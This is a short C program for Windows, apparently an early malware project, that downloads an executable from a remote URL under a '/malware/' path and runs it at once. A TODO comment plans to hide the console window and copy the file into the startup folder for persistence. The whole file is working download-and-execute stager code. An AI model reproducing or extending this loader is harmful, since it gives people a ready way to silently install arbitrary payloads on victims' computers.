#include <Windows.h>
#include <urlmon.h>
#include <stdio.h>

#pragma comment(lib,"urlmon.lib")

//Constants
#define DOWNLOAD_URL "http://www.ciholas.fr/malware/MalwareMsgBox.exe"
#define DOWNLOADED_FILE_NAME "Downloaded.exe"

// TO:DO
// Make it silent, No terminal pop up
// Make it copy the exe into the start up space

//Main Function
int main() {

    //Download File from Website
    HRESULT hr = URLDownloadToFileA(NULL, DOWNLOAD_URL, DOWNLOADED_FILE_NAME, 0, NULL);

    //Verify Success
    if (hr != S_OK) {
        printf("Download Failed. Press Any Key to Continue ...");
        getchar();
        return EXIT_FAILURE;
    }

    //

    //Execute Program
    HINSTANCE hi = ShellExecuteA(NULL, NULL, DOWNLOADED_FILE_NAME, NULL, NULL, SW_SHOWNORMAL);

    //Verify Success
    if (hi >= 0 && hi <= 32) {
        printf("Execution Failed. Press any key to exit ...");
        getchar();
        return EXIT_FAILURE;
    }

    printf("Execution Successful. Press any key to exit ...");
    getchar();
    return EXIT_SUCCESS;

}